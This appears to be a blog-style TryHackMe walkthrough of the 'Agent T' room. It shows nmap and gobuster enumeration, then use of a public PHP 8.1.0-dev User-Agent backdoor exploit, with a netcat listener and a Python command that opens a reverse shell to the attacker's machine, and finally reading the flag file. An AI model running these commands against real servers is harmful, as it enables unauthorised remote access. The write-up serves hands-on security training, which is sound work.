---
layout: post
title: "Agent T - TryHackMe Walkthrough"
date: 2025-05-20
author: D3adshot
tags: [TryHackMe, Walkthrough, PHP, RCE, Privilege Escalation]
---

**Room:** Agent T (Challenge)  
**Difficulty:** Easy  
**Focus:** PHP 8.1.0-dev RCE, Enumeration, Privilege Escalation    
**Date:** 20 May 2025

---

## First Things First

### Recon & Enumeration

Ran a full Nmap scan on the target:

> - nmap -sC -sV target ip

**Open ports discovered:**

> - 22 (SSH)  
> - 80 (HTTP)  

Visiting the website revealed a basic **Agent Portal** (Dashboard) login page.

I ran a directory brute-force using Gobuster and found /info.php, which revealed the PHP version running: **PHP 8.1.0-dev**.

- gobuster dir -u http://<target ip> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -o gobuster.txt

---

## Exploitation

PHP 8.1.0-dev has a known backdoor from March 2021 allowing code execution via the User-Agent header.

I downloaded the exploit from Exploit-DB (ID 49933):

- [Exploit DB - PHP 8.1.0-dev Backdoor RCE](https://www.exploit-db.com/exploits/49933)

Then cloned the exploit repository:

- git clone https://github.com/flast101/php-8.1.0-dev-backdoor-rce.git  
- cd php-8.1.0-dev-backdoor-rce

Started a Netcat listener on a separate terminal:

- nc -lvnp 4444

> ## ⚠️ STOP!  
> Did you start the **Netcat listener on port 4444**?  
> If not, **do that before running the exploit!**

Run the Python exploit (make sure you have Python 3 installed):

- python3 --version  
- python3 revshell_php_8.1.0-dev.py http://10.10.X.X 10.8.X.X 4444

**IP Reference:**

- 10.10.X.X = Target (TryHackMe vulnerable machine)  
- 10.8.X.X = Attacker (Your attacking machine)

This gave me a reverse shell as www-data on my listener.

---

## Privilege Escalation

Looked for the flag (on the listening terminal):

find / -name flag.txt 2>/dev/null

Found it at:

- /flag.txt

Read the flag:

- cat /flag.txt



> 🔥 **Paste the flag in the challenge answer.** 🔥


---

## Tools Used

- Nmap  
- Gobuster  
- Netcat  
- Python  
- Exploit-DB  

---

## Lessons Learned

- Exposing dev versions like PHP 8.1.0-dev in production is dangerous.  
- PHPinfo pages can leak sensitive version data.  
- Always test custom headers like User-Agent for RCE.

---

> *Learn. Hack. Repeat.*
